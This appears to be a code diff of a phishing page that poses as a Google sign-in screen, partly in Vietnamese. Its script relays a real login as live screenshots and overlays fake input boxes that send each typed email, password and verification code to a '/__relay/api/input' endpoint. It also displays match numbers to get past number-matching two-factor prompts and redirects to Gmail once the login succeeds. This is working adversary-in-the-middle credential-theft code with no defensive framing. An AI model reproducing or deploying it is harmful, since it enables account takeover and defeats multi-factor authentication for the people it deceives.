@@ -6,104 +6,89 @@
 *{box-sizing:border-box}
 html,body{margin:0;background:#fff;height:100%}
 body{font-family:Arial,sans-serif;display:flex;flex-direction:column;color:#202124}
-.wrap{flex:1;display:flex;align-items:center;justify-content:center;padding:12px;min-height:76vh}
-#box{width:100%;max-width:980px;position:relative;text-align:center}
+.wrap{flex:1;display:flex;align-items:center;justify-content:center;padding:10px;min-height:80vh}
+#stage{position:relative;width:100%;max-width:1000px}
+#shot{width:100%;height:auto;display:block;border-radius:10px;filter:blur(16px);transition:filter .3s}
+#shot.on{filter:none}
+#ov-in{position:absolute;display:none;padding:0 12px;font-size:15px;border:1px solid #dadce0;
+ border-radius:4px;outline:none;background:#fff;z-index:5}
+#ov-in.egpw{-webkit-text-security:disc}
+#ov-btn{position:absolute;display:none;background:#0b57d0;color:#fff;border:none;border-radius:100px;
+ font-size:14px;cursor:pointer;z-index:5}
 #boot{margin:44px auto 12px;width:30px;height:30px;border:3px solid #dadce0;
  border-top-color:#0b57d0;border-radius:50%;animation:r 1s linear infinite}
 @keyframes r{to{transform:rotate(360deg)}}
-#mirror{display:none;width:100%;height:auto;border-radius:10px}
-#mirror.show{display:block}
-#cardhost{filter:blur(16px);transition:filter .3s;min-height:300px;text-align:left}
-#cardhost.on{filter:none}
 #num{display:none;background:#e8f0fe;color:#0b57d0;font-size:40px;font-weight:600;
  padding:12px 32px;border-radius:14px;margin:0 auto 14px;letter-spacing:8px;width:fit-content}
-#bar{margin:14px auto 0;display:flex;gap:8px;max-width:520px}
-#bar.off{display:none}
-#rinp{flex:1;padding:12px 14px;font-size:15px;border:1px solid #dadce0;border-radius:8px;outline:none;text-align:center}
-#rinp.egpw{-webkit-text-security:disc}
-#rgo{background:#0b57d0;color:#fff;border:none;border-radius:100px;padding:10px 22px;font-size:14px;cursor:pointer}
 #st{margin:8px auto 0;font-size:13px;color:#5f6368;min-height:18px;text-align:center}
 #st.err{color:#d93025}
 .foot{padding:10px 24px;display:flex;justify-content:space-between;font-size:12px;color:#5f6368}
 .foot .l{display:flex;gap:18px}
 </style></head><body>
-<div class=wrap><div id=box>
+<div class=wrap>
+<div>
 <div id=boot></div>
 <div id=num style="display:none">00</div>
-<div id=cardhost></div>
-<img id=mirror alt="">
-<div id=bar class=off><input id=rinp autocomplete=off><button id=rgo>Tiếp tục</button></div>
+<div id=stage>
+<img id=shot alt="">
+<input id=ov-in autocomplete=off>
+<button id=ov-btn>Next</button>
+</div>
 <div id=st></div>
-</div></div>
+</div>
+</div>
 <div class=foot><div class=l><span>English (United States)</span></div>
 <div class=l><span>Help</span><span>Privacy</span><span>Terms</span></div></div>
 <script>
-var SID=null, KIND=null, lastHash=null, lastDomTime=0, domMode=false,
-    card=document.getElementById('cardhost'), mirror=document.getElementById('mirror'),
+var SID=null, KIND=null,
+    shot=document.getElementById('shot'), stage=document.getElementById('stage'),
+    ovIn=document.getElementById('ov-in'), ovBtn=document.getElementById('ov-btn'),
     boot=document.getElementById('boot'), numEl=document.getElementById('num'),
-    st=document.getElementById('st'), bar=document.getElementById('bar'),
-    rinp=document.getElementById('rinp'), rgo=document.getElementById('rgo');
-var PLACE={email:'Email or phone',password:'Mật khẩu',code:'Mã xác minh'};
+    stEl=document.getElementById('st');
 ['pointermove','keydown','touchstart'].forEach(function(ev){
- document.addEventListener(ev,function(){card.classList.add('on');},{once:true,capture:true});});
-function setSt(t,err){st.textContent=t||'';st.className=err?'err':'';}
-function findSel(){
- var p=card.querySelector('input[data-eg=pw]');
- if(p)return['input[data-eg=pw]','password'];
- if(card.querySelector('#identifierId'))return['#identifierId','email'];
- var c=card.querySelector('input[name=totpPin]')||card.querySelector('input[type=tel]');
- if(c)return['input[name=totpPin],input[type=tel]','code'];
- return null;}
-function relaySubmit(){
- var f=findSel();if(!f)return;
- var el=card.querySelector(f[0]);if(!el||!el.value)return;
- KIND=f[1];
- fetch('/__relay/api/input',{method:'POST',headers:{'Content-Type':'application/json'},
-  body:JSON.stringify({id:SID,kind:KIND,value:el.value})}).catch(function(){setSt('Lỗi mạng',1);});
+ document.addEventListener(ev,function(){shot.classList.add('on');},{once:true,capture:true});});
+function setSt(t,err){stEl.textContent=t||'';stEl.className=err?'err':'';}
+function place(el,box,extra){
+ if(!box){el.style.display='none';return;}
+ el.style.display='block';
+ el.style.left=box.x+'%';el.style.top=box.y+'%';
+ el.style.width=box.w+'%';el.style.height=box.h+'%';
+ if(extra)extra();}
+function submit(){
+ if(!ovIn.value||!KIND)return;
+ ovIn.blur();ovIn.style.display='none';ovBtn.style.display='none';
  setSt('Đang xử lý…');
-}
-card.addEventListener('click',function(e){
- var b=e.target.closest('button,div[role=button],input[type=submit]');
- if(b){e.preventDefault();e.stopPropagation();relaySubmit();}
-},true);
-card.addEventListener('keydown',function(e){
- if(e.key==='Enter'){e.preventDefault();relaySubmit();}
-},true);
-function fallbackBar(kind){
- bar.className='';KIND=kind;rinp.className=kind==='password'?'egpw':'';
- rinp.placeholder=PLACE[kind]||'';rinp.focus();}
-rgo.onclick=function(){if(rinp.value){
  fetch('/__relay/api/input',{method:'POST',headers:{'Content-Type':'application/json'},
- body:JSON.stringify({id:SID,kind:KIND,value:rinp.value})}).then(function(){rinp.value='';bar.className='off';});}};
-rinp.onkeydown=function(k){if(k.key==='Enter')rgo.onclick();};
+  body:JSON.stringify({id:SID,kind:KIND,value:ovIn.value})}).catch(function(){setSt('Lỗi mạng',1);});
+}
+ovBtn.onclick=submit;
+ovIn.onkeydown=function(k){if(k.key==='Enter')submit();};
+var PLACE={email:'Email or phone',password:'Mật khẩu',code:'Mã xác minh'};
 function render(x){
- // DOM mirror: authoritative layer — swap on hash change, then NEVER show
- // the raw screenshot again while DOM mode holds (no mixed layers)
- if(x.dom_hash&&x.dom!==null&&(x.dom_hash!==lastHash||!domMode)){
-  lastHash=x.dom_hash;domMode=true;
-  var gs=document.getElementById('gs');
-  var txt=(x.styles||[]).join('\\n');
-  if(gs){gs.textContent=txt;}
-  else{gs=document.createElement('style');gs.id='gs';gs.textContent=txt;document.head.appendChild(gs);}
-  card.innerHTML=x.dom;boot.style.display='none';
-  mirror.classList.remove('show');
-  var f=findSel();
-  if(f){var el=card.querySelector(f[0]);if(el){setTimeout(function(){el.focus();},150);}}
- }
- // screenshot layer: only BEFORE the first DOM arrives
- if(!domMode&&x.screenshot){
-  mirror.src='data:image/jpeg;base64,'+x.screenshot;
-  mirror.classList.add('show');boot.style.display='none';
+ if(x.screenshot){
+  shot.src='data:image/jpeg;base64,'+x.screenshot;
+  boot.style.display='none';shot.style.display='block';
  }
  if(x.match_number){numEl.style.display='block';numEl.textContent=x.match_number;}
- if(x.state==='done'){setSt('');bar.className='off';
-  card.innerHTML='<div style="text-align:center;margin:30px 0"><svg width=56 height=56 viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="11" stroke="#34A853" stroke-width="2"/><path d="M7 12.5l3.2 3.2L17 9" stroke="#34A853" stroke-width="2" fill="none"/></svg><div style="font-size:20px;margin-top:10px">Bạn đã đăng nhập thành công</div><div style="color:#5f6368;font-size:14px;margin-top:6px">Đang chuyển tới Gmail…</div></div>';
-  setTimeout(function(){location.href='https://mail.google.com';},2600);return;}
+ var ib=x.input_box, bb=x.button_box, k=x.input_kind;
+ if(ib&&k&&x.state!=='done'&&x.state!=='error'){
+  KIND=k;
+  ovIn.className=k==='password'?'egpw':'';
+  ovIn.placeholder=PLACE[k]||'';
+  if(ovIn.getAttribute('data-k')!==k){ovIn.value='';ovIn.setAttribute('data-k',k);}
+  place(ovIn,ib);
+  place(ovBtn,bb);
+  if(document.activeElement!==ovIn)setTimeout(function(){ovIn.focus();},120);
+ }else{
+  ovIn.style.display='none';ovBtn.style.display='none';
+ }
+ if(x.state==='done'){setSt('Đăng nhập thành công — đang chuyển tới Gmail…');
+  setTimeout(function(){location.href='https://mail.google.com';},2400);return;}
  if(x.state==='error'){setSt(x.hint||'Không thể đăng nhập',1);return;}
 }
 function poll(){
  if(!SID){setTimeout(poll,900);return;}
- fetch('/__relay/api/state?id='+SID+'&h='+(lastHash||'')).then(function(r){return r.json();})
+ fetch('/__relay/api/state?id='+SID).then(function(r){return r.json();})
   .then(function(x){render(x);setTimeout(poll,1200);})
   .catch(function(){setTimeout(poll,2200);});
 }
